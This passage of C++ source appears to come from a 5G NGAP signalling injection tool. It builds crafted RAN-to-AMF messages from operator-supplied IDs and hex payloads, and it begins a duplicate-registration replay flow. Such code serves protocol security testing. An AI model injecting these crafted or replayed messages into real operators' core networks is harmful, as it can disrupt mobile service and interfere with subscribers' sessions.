                                                {"PDU-Session-ID", default_to_string(psi)},
                                                {"TEID", default_to_string(teid)},
                                                {"TransportLayerAddress", addr},
                                                {"QFI", default_to_string(static_cast<unsigned>(qfi))},
                                                {"PLMN", plmn},
                                                {"TAC", tac}});
      return single(injectable_ngap_pdu{build_path_switch_request(amf_id, ran_id, psi, teid, addr, qfi, plmn, tac),
                                 "PathSwitchRequest"});
    }
    case ue_message_type::initial_ue_message: {
      const uint64_t    ran_id  = read_ran_id();
      const std::string nas_hex = read_valid_hex_or_default("NAS PDU hex", "00");
      const std::string tac     = read_tac_or_default("TAC", "000007");
      const std::string plmn    = read_plmn_or_default("PLMN", "00f110");
      const std::string cause   = get_input_or_default<std::string>("RRC Establishment Cause", "mo-sig");
      print_confirmation("InitialUEMessage", {{"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                               {"NAS-PDU", nas_hex},
                                               {"TAC", tac},
                                               {"PLMN", plmn},
                                               {"RRCEstablishmentCause", cause}});
      return single(injectable_ngap_pdu{build_initial_ue_message(ran_id, make_hex_byte_buffer_or_throw(nas_hex), tac, plmn, cause),
                                         "InitialUEMessage"});
    }
    case ue_message_type::initial_context_setup_response: {
      const uint64_t    amf_id = read_amf_id();
      const uint64_t    ran_id = read_ran_id();
      const auto        psi    = static_cast<uint16_t>(read_uint64_or_default("PDU Session ID", 1, max_pdu_session_id));
      const auto        teid   = static_cast<uint32_t>(read_uint64_or_default("TEID", 1, 0xffffffffULL));
      const std::string addr   = read_ipv4_or_default("Transport Layer Address", "127.0.0.1");
      const auto        qfi    = static_cast<uint8_t>(read_uint64_or_default("QFI", 1, 63));
      print_confirmation("InitialContextSetupResponse", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                          {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                          {"PDU-Session-ID", default_to_string(psi)},
                                                          {"TEID", default_to_string(teid)},
                                                          {"TransportLayerAddress", addr},
                                                          {"QFI", default_to_string(static_cast<unsigned>(qfi))}});
      return single(injectable_ngap_pdu{build_initial_context_setup_response(amf_id, ran_id, psi, teid, addr, qfi),
                                         "InitialContextSetupResponse"});
    }
    case ue_message_type::ue_radio_capability_info_indication: {
      const uint64_t    amf_id  = read_amf_id();
      const uint64_t    ran_id  = read_ran_id();
      const std::string cap_hex = read_valid_hex_or_default("UE Radio Capability hex", "00");
      print_confirmation("UERadioCapabilityInfoIndication", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                              {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                              {"UE-Radio-Capability", cap_hex}});
      return single(injectable_ngap_pdu{
          build_ue_radio_capability_info_indication(amf_id, ran_id, make_hex_byte_buffer_or_throw(cap_hex)),
          "UERadioCapabilityInfoIndication"});
    }
    case ue_message_type::initial_context_setup_failure: {
      const uint64_t    amf_id = read_amf_id();
      const uint64_t    ran_id = read_ran_id();
      const std::string cause  = get_input_or_default<std::string>("Cause", "radio-connection-with-ue-lost");
      print_confirmation("InitialContextSetupFailure", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                         {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                         {"Cause", cause}});
      return single(injectable_ngap_pdu{build_initial_context_setup_failure(amf_id, ran_id, cause),
                                         "InitialContextSetupFailure"});
    }
    case ue_message_type::ue_context_release_complete: {
      const uint64_t amf_id = read_amf_id();
      const uint64_t ran_id = read_ran_id();
      print_confirmation("UEContextReleaseComplete", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                       {"RAN-UE-NGAP-ID", default_to_string(ran_id)}});
      return single(injectable_ngap_pdu{build_ue_context_release_complete(amf_id, ran_id),
                                         "UEContextReleaseComplete"});
    }
    case ue_message_type::ue_context_modification_response: {
      const uint64_t    amf_id    = read_amf_id();
      const uint64_t    ran_id    = read_ran_id();
      const std::string rrc_state = get_input_or_default<std::string>("RRC State", "connected");
      const std::string plmn      = read_plmn_or_default("PLMN", "00f110");
      const std::string tac       = read_tac_or_default("TAC", "000007");
      print_confirmation("UEContextModificationResponse", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                            {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                            {"RRC-State", rrc_state},
                                                            {"PLMN", plmn},
                                                            {"TAC", tac}});
      return single(injectable_ngap_pdu{build_ue_context_modification_response(amf_id, ran_id, rrc_state, plmn, tac),
                                         "UEContextModificationResponse"});
    }
    case ue_message_type::ue_context_modification_failure: {
      const uint64_t    amf_id = read_amf_id();
      const uint64_t    ran_id = read_ran_id();
      const std::string cause  = get_input_or_default<std::string>("Cause", "radio-connection-with-ue-lost");
      print_confirmation("UEContextModificationFailure", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                           {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                           {"Cause", cause}});
      return single(injectable_ngap_pdu{build_ue_context_modification_failure(amf_id, ran_id, cause),
                                         "UEContextModificationFailure"});
    }
    case ue_message_type::rrc_inactive_transition_report: {
      const uint64_t    amf_id    = read_amf_id();
      const uint64_t    ran_id    = read_ran_id();
      const std::string rrc_state = get_input_or_default<std::string>("RRC State", "inactive");
      const std::string plmn      = read_plmn_or_default("PLMN", "00f110");
      const std::string tac       = read_tac_or_default("TAC", "000007");
      print_confirmation("RRCInactiveTransitionReport", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                          {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                          {"RRC-State", rrc_state},
                                                          {"PLMN", plmn},
                                                          {"TAC", tac}});
      return single(injectable_ngap_pdu{build_rrc_inactive_transition_report(amf_id, ran_id, rrc_state, plmn, tac),
                                         "RRCInactiveTransitionReport"});
    }
    case ue_message_type::ue_context_suspend_request: {
      const uint64_t    amf_id = read_amf_id();
      const uint64_t    ran_id = read_ran_id();
      const bool        include_location = get_input_or_default<bool>("Include User Location Info", true);
      const std::string plmn   = include_location ? read_plmn_or_default("PLMN", "00f110") : "";
      const std::string tac    = include_location ? read_tac_or_default("TAC", "000007") : "";
      print_confirmation("UEContextSuspendRequest", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                       {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                       {"UserLocationInfo", include_location ? "Y" : "N"},
                                                       {"PLMN", plmn},
                                                       {"TAC", tac}});
      return single(injectable_ngap_pdu{build_ue_context_suspend_request(amf_id, ran_id, include_location, plmn, tac),
                                         "UEContextSuspendRequest"});
    }
    case ue_message_type::ue_context_resume_request: {
      const uint64_t    amf_id = read_amf_id();
      const uint64_t    ran_id = read_ran_id();
      const std::string rrc_resume_cause = get_input_or_default<std::string>("RRC Resume Cause", "mo-sig");
      const bool        include_location = get_input_or_default<bool>("Include User Location Info", true);
      const std::string plmn   = include_location ? read_plmn_or_default("PLMN", "00f110") : "";
      const std::string tac    = include_location ? read_tac_or_default("TAC", "000007") : "";
      print_confirmation("UEContextResumeRequest", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                      {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                      {"RRC-Resume-Cause", rrc_resume_cause},
                                                      {"UserLocationInfo", include_location ? "Y" : "N"},
                                                      {"PLMN", plmn},
                                                      {"TAC", tac}});
      return single(injectable_ngap_pdu{build_ue_context_resume_request(amf_id, ran_id, rrc_resume_cause, include_location, plmn, tac),
                                         "UEContextResumeRequest"});
    }
    case ue_message_type::ran_cp_relocation_indication: {
      const uint64_t    ran_id      = read_ran_id();
      const auto        amf_set_id  = static_cast<uint16_t>(read_uint64_or_default("AMF Set ID", 1, 1023));
      const auto        amf_pointer = static_cast<uint8_t>(read_uint64_or_default("AMF Pointer", 0, 63));
      const std::string tmsi        = read_fixed_hex_or_default("5G-TMSI hex", "00000001", 4);
      const std::string plmn        = read_plmn_or_default("PLMN", "00f110");
      const std::string tac         = read_tac_or_default("TAC", "000007");
      const auto        eutra_cell  = static_cast<uint32_t>(read_uint64_or_default("EUTRA Cell ID", 1, 0x0fffffffULL));
      const auto        ul_mac      = static_cast<uint16_t>(read_uint64_or_default("UL NAS MAC", 0, 0xffff));
      const auto        ul_count    = static_cast<uint8_t>(read_uint64_or_default("UL NAS Count", 0, 31));
      print_confirmation("RANCPRelocationIndication", {{"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                        {"AMF-Set-ID", default_to_string(amf_set_id)},
                                                        {"AMF-Pointer", default_to_string(static_cast<unsigned>(amf_pointer))},
                                                        {"5G-TMSI", tmsi},
                                                        {"PLMN", plmn},
                                                        {"TAC", tac},
                                                        {"EUTRA-Cell-ID", default_to_string(eutra_cell)},
                                                        {"UL-NAS-MAC", default_to_string(ul_mac)},
                                                        {"UL-NAS-Count", default_to_string(static_cast<unsigned>(ul_count))}});
      return single(injectable_ngap_pdu{build_ran_cp_relocation_indication(ran_id, amf_set_id, amf_pointer, tmsi, plmn, tac, eutra_cell, ul_mac, ul_count),
                                         "RANCPRelocationIndication"});
    }
    case ue_message_type::pdu_session_resource_setup_response: {
      const uint64_t    amf_id = read_amf_id();
      const uint64_t    ran_id = read_ran_id();
      const auto        psi    = static_cast<uint16_t>(read_uint64_or_default("PDU Session ID", 1, max_pdu_session_id));
      const auto        teid   = static_cast<uint32_t>(read_uint64_or_default("TEID", 1, 0xffffffffULL));
      const std::string addr   = read_ipv4_or_default("Transport Layer Address", "127.0.0.1");
      const auto        qfi    = static_cast<uint8_t>(read_uint64_or_default("QFI", 1, 63));
      print_confirmation("PDUSessionResourceSetupResponse", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                              {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                              {"PDU-Session-ID", default_to_string(psi)},
                                                              {"TEID", default_to_string(teid)},
                                                              {"TransportLayerAddress", addr},
                                                              {"QFI", default_to_string(static_cast<unsigned>(qfi))}});
      return single(injectable_ngap_pdu{build_pdu_session_resource_setup_response(amf_id, ran_id, psi, teid, addr, qfi),
                                         "PDUSessionResourceSetupResponse"});
    }
    case ue_message_type::pdu_session_resource_modify_response: {
      const uint64_t amf_id = read_amf_id();
      const uint64_t ran_id = read_ran_id();
      const auto     psi    = static_cast<uint16_t>(read_uint64_or_default("PDU Session ID", 1, max_pdu_session_id));
      const auto     qfi    = static_cast<uint8_t>(read_uint64_or_default("QFI", 1, 63));
      print_confirmation("PDUSessionResourceModifyResponse", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                               {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                               {"PDU-Session-ID", default_to_string(psi)},
                                                               {"QFI", default_to_string(static_cast<unsigned>(qfi))}});
      return single(injectable_ngap_pdu{build_pdu_session_resource_modify_response(amf_id, ran_id, psi, qfi),
                                         "PDUSessionResourceModifyResponse"});
    }
    case ue_message_type::pdu_session_resource_modify_indication: {
      const uint64_t    amf_id = read_amf_id();
      const uint64_t    ran_id = read_ran_id();
      const auto        psi    = static_cast<uint16_t>(read_uint64_or_default("PDU Session ID", 1, max_pdu_session_id));
      const auto        teid   = static_cast<uint32_t>(read_uint64_or_default("TEID", 1, 0xffffffffULL));
      const std::string addr   = read_ipv4_or_default("Transport Layer Address", "127.0.0.1");
      const auto        qfi    = static_cast<uint8_t>(read_uint64_or_default("QFI", 1, 63));
      print_confirmation("PDUSessionResourceModifyIndication", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                                 {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                                 {"PDU-Session-ID", default_to_string(psi)},
                                                                 {"TEID", default_to_string(teid)},
                                                                 {"TransportLayerAddress", addr},
                                                                 {"QFI", default_to_string(static_cast<unsigned>(qfi))}});
      return single(injectable_ngap_pdu{build_pdu_session_resource_modify_indication(amf_id, ran_id, psi, teid, addr, qfi),
                                         "PDUSessionResourceModifyIndication"});
    }
    case ue_message_type::ue_radio_capability_check_response: {
      const uint64_t amf_id = read_amf_id();
      const uint64_t ran_id = read_ran_id();
      const bool     ims    = get_input_or_default<bool>("IMS Voice Support", true);
      print_confirmation("UERadioCapabilityCheckResponse", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                             {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                             {"IMS-Voice-Support", ims ? "supported" : "not-supported"}});
      return single(injectable_ngap_pdu{build_ue_radio_capability_check_response(amf_id, ran_id, ims),
                                         "UERadioCapabilityCheckResponse"});
    }
    case ue_message_type::ue_radio_capability_id_mapping_response: {
      const std::string cap_id_hex = read_valid_hex_or_default("UE Radio Capability ID hex", "00");
      const std::string cap_hex    = read_valid_hex_or_default("UE Radio Capability hex", "00");
      print_confirmation("UERadioCapabilityIDMappingResponse", {{"UE-Radio-Capability-ID", cap_id_hex},
                                                                 {"UE-Radio-Capability", cap_hex}});
      return single(injectable_ngap_pdu{
          build_ue_radio_capability_id_mapping_response(cap_id_hex, make_hex_byte_buffer_or_throw(cap_hex)),
          "UERadioCapabilityIDMappingResponse"});
    }
    case ue_message_type::location_report: {
      const uint64_t    amf_id = read_amf_id();
      const uint64_t    ran_id = read_ran_id();
      const std::string plmn   = read_plmn_or_default("PLMN", "00f110");
      const std::string tac    = read_tac_or_default("TAC", "000007");
      const std::string event  = get_input_or_default<std::string>("Location Event Type", "direct");
      print_confirmation("LocationReport", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                             {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                             {"PLMN", plmn},
                                             {"TAC", tac},
                                             {"EventType", event}});
      return single(injectable_ngap_pdu{build_location_report(amf_id, ran_id, plmn, tac, event), "LocationReport"});
    }
    case ue_message_type::location_reporting_failure_indication: {
      const uint64_t    amf_id = read_amf_id();
      const uint64_t    ran_id = read_ran_id();
      const std::string cause  = get_input_or_default<std::string>("Cause", "radio-connection-with-ue-lost");
      print_confirmation("LocationReportingFailureIndication", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                                 {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                                 {"Cause", cause}});
      return single(injectable_ngap_pdu{build_location_reporting_failure_indication(amf_id, ran_id, cause),
                                         "LocationReportingFailureIndication"});
    }
    case ue_message_type::handover_notify: {
      const uint64_t    amf_id = read_amf_id();
      const uint64_t    ran_id = read_ran_id();
      const std::string plmn   = read_plmn_or_default("PLMN", "00f110");
      const std::string tac    = read_tac_or_default("TAC", "000007");
      print_confirmation("HandoverNotify", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                             {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                             {"PLMN", plmn},
                                             {"TAC", tac}});
      return single(injectable_ngap_pdu{build_handover_notify(amf_id, ran_id, plmn, tac), "HandoverNotify"});
    }
    case ue_message_type::uplink_ran_status_transfer: {
      const uint64_t amf_id = read_amf_id();
      const uint64_t ran_id = read_ran_id();
      const auto     drb_id = static_cast<uint8_t>(read_uint64_or_default("DRB ID", 1, 32));
      const auto     ul_hfn = static_cast<uint32_t>(read_uint64_or_default("UL HFN", 0, 0xfffff));
      const auto     ul_sn  = static_cast<uint16_t>(read_uint64_or_default("UL PDCP SN", 0, 4095));
      const auto     dl_hfn = static_cast<uint32_t>(read_uint64_or_default("DL HFN", 0, 0xfffff));
      const auto     dl_sn  = static_cast<uint16_t>(read_uint64_or_default("DL PDCP SN", 0, 4095));
      print_confirmation("UplinkRANStatusTransfer", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                      {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                      {"DRB-ID", default_to_string(static_cast<unsigned>(drb_id))},
                                                      {"UL-HFN", default_to_string(ul_hfn)},
                                                      {"UL-PDCP-SN", default_to_string(ul_sn)},
                                                      {"DL-HFN", default_to_string(dl_hfn)},
                                                      {"DL-PDCP-SN", default_to_string(dl_sn)}});
      return single(injectable_ngap_pdu{build_uplink_ran_status_transfer(amf_id, ran_id, drb_id, ul_hfn, ul_sn, dl_hfn, dl_sn),
                                         "UplinkRANStatusTransfer"});
    }
    case ue_message_type::uplink_ran_early_status_transfer: {
      const uint64_t amf_id = read_amf_id();
      const uint64_t ran_id = read_ran_id();
      const auto     drb_id = static_cast<uint8_t>(read_uint64_or_default("DRB ID", 1, 32));
      const auto     dl_hfn = static_cast<uint32_t>(read_uint64_or_default("First DL HFN", 0, 0xfffff));
      const auto     dl_sn  = static_cast<uint16_t>(read_uint64_or_default("First DL PDCP SN", 0, 4095));
      print_confirmation("UplinkRANEarlyStatusTransfer", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                           {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                           {"DRB-ID", default_to_string(static_cast<unsigned>(drb_id))},
                                                           {"First-DL-HFN", default_to_string(dl_hfn)},
                                                           {"First-DL-PDCP-SN", default_to_string(dl_sn)}});
      return single(injectable_ngap_pdu{build_uplink_ran_early_status_transfer(amf_id, ran_id, drb_id, dl_hfn, dl_sn),
                                         "UplinkRANEarlyStatusTransfer"});
    }
    case ue_message_type::trace_failure_indication: {
      const uint64_t    amf_id   = read_amf_id();
      const uint64_t    ran_id   = read_ran_id();
      const std::string trace_id = read_fixed_hex_or_default("NG-RAN Trace ID hex", "0000000000000000", 8);
      const std::string cause    = get_input_or_default<std::string>("Cause", "radio-connection-with-ue-lost");
      print_confirmation("TraceFailureIndication", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                     {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                     {"NG-RAN-Trace-ID", trace_id},
                                                     {"Cause", cause}});
      return single(injectable_ngap_pdu{build_trace_failure_indication(amf_id, ran_id, trace_id, cause),
                                         "TraceFailureIndication"});
    }
    case ue_message_type::cell_traffic_trace: {
      const uint64_t    amf_id   = read_amf_id();
      const uint64_t    ran_id   = read_ran_id();
      const std::string trace_id = read_fixed_hex_or_default("NG-RAN Trace ID hex", "0000000000000000", 8);
      const std::string plmn     = read_plmn_or_default("PLMN", "00f110");
      const std::string addr     = read_ipv4_or_default("Trace Collection Entity IP", "127.0.0.1");
      const bool        privacy  = get_input_or_default<bool>("Privacy Immediate MDT", true);
      print_confirmation("CellTrafficTrace", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                               {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                               {"NG-RAN-Trace-ID", trace_id},
                                               {"PLMN", plmn},
                                               {"TraceCollectionEntityIP", addr},
                                               {"Privacy", privacy ? "immediateMDT" : "loggedMDT"}});
      return single(injectable_ngap_pdu{build_cell_traffic_trace(amf_id, ran_id, trace_id, plmn, addr, privacy),
                                         "CellTrafficTrace"});
    }
    case ue_message_type::secondary_rat_data_usage_report: {
      const uint64_t    amf_id = read_amf_id();
      const uint64_t    ran_id = read_ran_id();
      const auto        psi    = static_cast<uint16_t>(read_uint64_or_default("PDU Session ID", 1, max_pdu_session_id));
      const bool        ho_flag = get_input_or_default<bool>("Include HO Flag", false);
      const bool        include_location = get_input_or_default<bool>("Include User Location Info", true);
      const std::string plmn   = include_location ? read_plmn_or_default("PLMN", "00f110") : "";
      const std::string tac    = include_location ? read_tac_or_default("TAC", "000007") : "";
      print_confirmation("SecondaryRATDataUsageReport", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                           {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                           {"PDU-Session-ID", default_to_string(psi)},
                                                           {"HO-Flag", ho_flag ? "ho-prep" : "not-present"},
                                                           {"UserLocationInfo", include_location ? "Y" : "N"},
                                                           {"PLMN", plmn},
                                                           {"TAC", tac}});
      return single(injectable_ngap_pdu{build_secondary_rat_data_usage_report(amf_id,
                                                                               ran_id,
                                                                               psi,
                                                                               ho_flag,
                                                                               include_location,
                                                                               plmn,
                                                                               tac),
                                         "SecondaryRATDataUsageReport"});
    }
    case ue_message_type::connection_establishment_indication: {
      const auto amf_id = read_amf_id(); const auto ran_id = read_ran_id();
      print_confirmation("ConnectionEstablishmentIndication", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)}, {"RAN-UE-NGAP-ID", default_to_string(ran_id)}});
      return single({build_connection_establishment_indication(amf_id, ran_id), "ConnectionEstablishmentIndication"});
    }
    case ue_message_type::ue_context_suspend_response: {
      const auto amf_id = read_amf_id(); const auto ran_id = read_ran_id();
      print_confirmation("UEContextSuspendResponse", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)}, {"RAN-UE-NGAP-ID", default_to_string(ran_id)}});
      return single({build_ue_context_suspend_response(amf_id, ran_id), "UEContextSuspendResponse"});
    }
    case ue_message_type::ue_context_resume_response: {
      const auto amf_id = read_amf_id(); const auto ran_id = read_ran_id();
      print_confirmation("UEContextResumeResponse", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)}, {"RAN-UE-NGAP-ID", default_to_string(ran_id)}});
      return single({build_ue_context_resume_response(amf_id, ran_id), "UEContextResumeResponse"});
    }
    case ue_message_type::reroute_nas_request: {
      const auto ran_id = read_ran_id(); const auto amf_id = read_amf_id();
      const auto nas = read_valid_hex_or_default("NGAP message to reroute hex", "00");
      print_confirmation("RerouteNASRequest", {{"RAN-UE-NGAP-ID", default_to_string(ran_id)}, {"AMF-UE-NGAP-ID", default_to_string(amf_id)}, {"NGAP-Message", nas}, {"AMF-Set-ID", "0"}});
      return single({build_reroute_nas_request(ran_id, amf_id, make_hex_byte_buffer_or_throw(nas)), "RerouteNASRequest"});
    }
    case ue_message_type::ue_information_transfer: {
      const auto set_id = read_fixed_hex_or_default("AMF Set ID hex", "0000", 2);
      const auto pointer = read_fixed_hex_or_default("AMF Pointer hex", "00", 1);
      const auto tmsi = read_fixed_hex_or_default("5G-TMSI hex", "00000000", 4);
      print_confirmation("UEInformationTransfer", {{"AMF-Set-ID", set_id}, {"AMF-Pointer", pointer}, {"5G-TMSI", tmsi}});
      return single({build_ue_information_transfer(set_id, pointer, tmsi), "UEInformationTransfer"});
    }
    case ue_message_type::broadcast_session_modification_response:
    case ue_message_type::broadcast_session_release_response:
    case ue_message_type::broadcast_session_setup_response:
    case ue_message_type::broadcast_session_transport_response: {
      const auto tmgi = read_fixed_hex_or_default("MBS TMGI hex", "000000000001", 6);
      const auto transfer = read_valid_hex_or_default("MBS response transfer hex", "00");
      if (message_type.value() == ue_message_type::broadcast_session_modification_response)
        return single({build_broadcast_session_modification_response(tmgi, make_hex_byte_buffer_or_throw(transfer)), "BroadcastSessionModificationResponse"});
      if (message_type.value() == ue_message_type::broadcast_session_release_response)
        return single({build_broadcast_session_release_response(tmgi, make_hex_byte_buffer_or_throw(transfer)), "BroadcastSessionReleaseResponse"});
      if (message_type.value() == ue_message_type::broadcast_session_setup_response)
        return single({build_broadcast_session_setup_response(tmgi, make_hex_byte_buffer_or_throw(transfer)), "BroadcastSessionSetupResponse"});
      return single({build_broadcast_session_transport_response(tmgi, make_hex_byte_buffer_or_throw(transfer)), "BroadcastSessionTransportResponse"});
    }
    case ue_message_type::distribution_setup_response: {
      const auto tmgi = read_fixed_hex_or_default("MBS TMGI hex", "000000000001", 6);
      const auto area = static_cast<uint32_t>(read_uint64_or_default("MBS Area Session ID", 1, 0xffffffffULL));
      const auto transfer = read_valid_hex_or_default("Distribution response transfer hex", "00");
      print_confirmation("DistributionSetupResponse", {{"TMGI", tmgi}, {"MBS-Area-Session-ID", default_to_string(area)}, {"Transfer", transfer}});
      return single({build_distribution_setup_response(tmgi, area, make_hex_byte_buffer_or_throw(transfer)), "DistributionSetupResponse"});
    }
    case ue_message_type::distribution_release_response: {
      const auto tmgi = read_fixed_hex_or_default("MBS TMGI hex", "000000000001", 6);
      const auto area = static_cast<uint32_t>(read_uint64_or_default("MBS Area Session ID", 1, 0xffffffffULL));
      print_confirmation("DistributionReleaseResponse", {{"TMGI", tmgi}, {"MBS-Area-Session-ID", default_to_string(area)}});
      return single({build_distribution_release_response(tmgi, area), "DistributionReleaseResponse"});
    }
    case ue_message_type::multicast_session_activation_response:
    case ue_message_type::multicast_session_deactivation_response:
    case ue_message_type::multicast_session_update_response: {
      const auto tmgi = read_fixed_hex_or_default("MBS TMGI hex", "000000000001", 6);
      if (message_type.value() == ue_message_type::multicast_session_activation_response)
        return single({build_multicast_session_activation_response(tmgi), "MulticastSessionActivationResponse"});
      if (message_type.value() == ue_message_type::multicast_session_deactivation_response)
        return single({build_multicast_session_deactivation_response(tmgi), "MulticastSessionDeactivationResponse"});
      const auto area = static_cast<uint32_t>(read_uint64_or_default("MBS Area Session ID", 1, 0xffffffffULL));
      return single({build_multicast_session_update_response(tmgi, area), "MulticastSessionUpdateResponse"});
    }
    case ue_message_type::timing_synchronisation_status_response: {
      const auto routing = read_valid_hex_or_default("Routing ID hex", "00");
      print_confirmation("TimingSynchronisationStatusResponse", {{"Routing-ID", routing}});
      return single({build_timing_synchronisation_status_response(make_hex_byte_buffer_or_throw(routing)), "TimingSynchronisationStatusResponse"});
    }
    case ue_message_type::handover_success: {
      const auto amf_id = read_amf_id(); const auto ran_id = read_ran_id();
      print_confirmation("HandoverSuccess", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)}, {"RAN-UE-NGAP-ID", default_to_string(ran_id)}});
      return single({build_handover_success(amf_id, ran_id), "HandoverSuccess"});
    }
    case ue_message_type::uplink_ran_configuration_transfer: {
      const auto transfer = read_valid_hex_or_default("SON configuration transfer hex", "00");
      return single({build_uplink_ran_configuration_transfer(make_hex_byte_buffer_or_throw(transfer)), "UplinkRANConfigurationTransfer"});
    }
    case ue_message_type::uplink_rim_information_transfer: {
      const auto transfer = read_valid_hex_or_default("RIM information transfer hex", "00");
      return single({build_uplink_rim_information_transfer(make_hex_byte_buffer_or_throw(transfer)), "UplinkRIMInformationTransfer"});
    }
    case ue_message_type::uplink_non_ue_associated_nrppa_transport: {
      const auto routing = read_valid_hex_or_default("Routing ID hex", "00");
      const auto pdu = read_valid_hex_or_default("NRPPa PDU hex", "00");
      return single({build_uplink_non_ue_associated_nrppa_transport(make_hex_byte_buffer_or_throw(routing), make_hex_byte_buffer_or_throw(pdu)), "UplinkNonUEAssociatedNRPPaTransport"});
    }
    case ue_message_type::uplink_ue_associated_nrppa_transport: {
      const auto amf_id = read_amf_id(); const auto ran_id = read_ran_id();
      const auto routing = read_valid_hex_or_default("Routing ID hex", "00");
      const auto pdu = read_valid_hex_or_default("NRPPa PDU hex", "00");
      return single({build_uplink_ue_associated_nrppa_transport(amf_id, ran_id, make_hex_byte_buffer_or_throw(routing), make_hex_byte_buffer_or_throw(pdu)), "UplinkUEAssociatedNRPPaTransport"});
    }
    case ue_message_type::ue_tnla_binding_release_request: {
      const auto amf_id = read_amf_id(); const auto ran_id = read_ran_id();
      return single({build_ue_tnla_binding_release_request(amf_id, ran_id), "UETNLABindingReleaseRequest"});
    }
    case ue_message_type::ran_paging_request: {
      const auto amf_id = read_amf_id(); const auto ran_id = read_ran_id();
      return single({build_ran_paging_request(amf_id, ran_id), "RANPagingRequest"});
    }
    case ue_message_type::timing_synchronisation_status_report: {
      const auto routing = read_valid_hex_or_default("Routing ID hex", "00");
      return single({build_timing_synchronisation_status_report(make_hex_byte_buffer_or_throw(routing)), "TimingSynchronisationStatusReport"});
    }
    case ue_message_type::write_replace_warning_response: {
      const auto msg_id = read_fixed_hex_or_default("Warning Message ID hex", "0000", 2);
      const auto serial = read_fixed_hex_or_default("Warning Serial Number hex", "0000", 2);
      return single({build_write_replace_warning_response(msg_id, serial), "WriteReplaceWarningResponse"});
    }
    case ue_message_type::pws_failure_indication: {
      const auto plmn = read_plmn_or_default("PLMN", "00f110");
      return single({build_pws_failure_indication(plmn), "PWSFailureIndication"});
    }
    case ue_message_type::pws_restart_indication: {
      const auto plmn = read_plmn_or_default("PLMN", "00f110");
      return single({build_pws_restart_indication(plmn), "PWSRestartIndication"});
    }
    case ue_message_type::duplicate_registration_replay_flow: {
      std::vector<injectable_ngap_pdu> pdus;
      const uint64_t ran_id = read_ran_id();
      const uint64_t amf_id = read_amf_id();
      const uint64_t ul_ran_id = read_uint64_or_default("Uplink RAN UE NGAP ID", ran_id, max_ran_ue_ngap_id);
      const std::string tac = read_tac_or_default("TAC", "000007");
      const std::string plmn = read_plmn_or_default("PLMN", "00f110");
      const std::string rrc_cause = get_input_or_default<std::string>("RRC Establishment Cause", "mo-sig");
      const auto wait_timeout_ms = static_cast<int>(read_uint64_or_default("AMF wait timeout ms", 10000, 600000));
      const auto inter_send_delay_ms = static_cast<int>(read_uint64_or_default("Inter-send delay ms", 0, 600000));

      const std::string registration_request_hex = read_valid_hex_or_default("1 Registration Request NAS PDU hex", "00");
      const std::string authentication_response_hex = read_valid_hex_or_default("3 Authentication Response NAS PDU hex", "00");
      const std::string security_mode_complete_hex = read_valid_hex_or_default("5 Security Mode Complete NAS PDU hex", "00");
      const std::string post_context_uplink_nas_hex_1 = read_valid_hex_or_default("8 Uplink NAS PDU hex #1", "00");
      const std::string post_context_uplink_nas_hex_2 = read_valid_hex_or_default("8 Uplink NAS PDU hex #2", "00");
      const std::string final_uplink_nas_hex = read_valid_hex_or_default("12 Final Uplink NAS PDU hex", "00");
      const std::string ue_radio_capability_hex = read_valid_hex_or_default("8 UE Radio Capability hex", "00");

      const auto pdu_session_id = static_cast<uint16_t>(read_uint64_or_default("PDU Session ID", 1, max_pdu_session_id));
      const auto qfi = static_cast<uint8_t>(read_uint64_or_default("QFI", 1, 63));
      const auto teid = static_cast<uint32_t>(read_uint64_or_default("Response TEID", 1, 0xffffffffULL));
      const std::string transport_layer_address = read_ipv4_or_default("Response Transport Layer Address", "127.0.0.1");

      pdus.push_back({build_initial_ue_message(ran_id, make_hex_byte_buffer_or_throw(registration_request_hex), tac, plmn, rrc_cause),
                      "InitialUEMessage"});
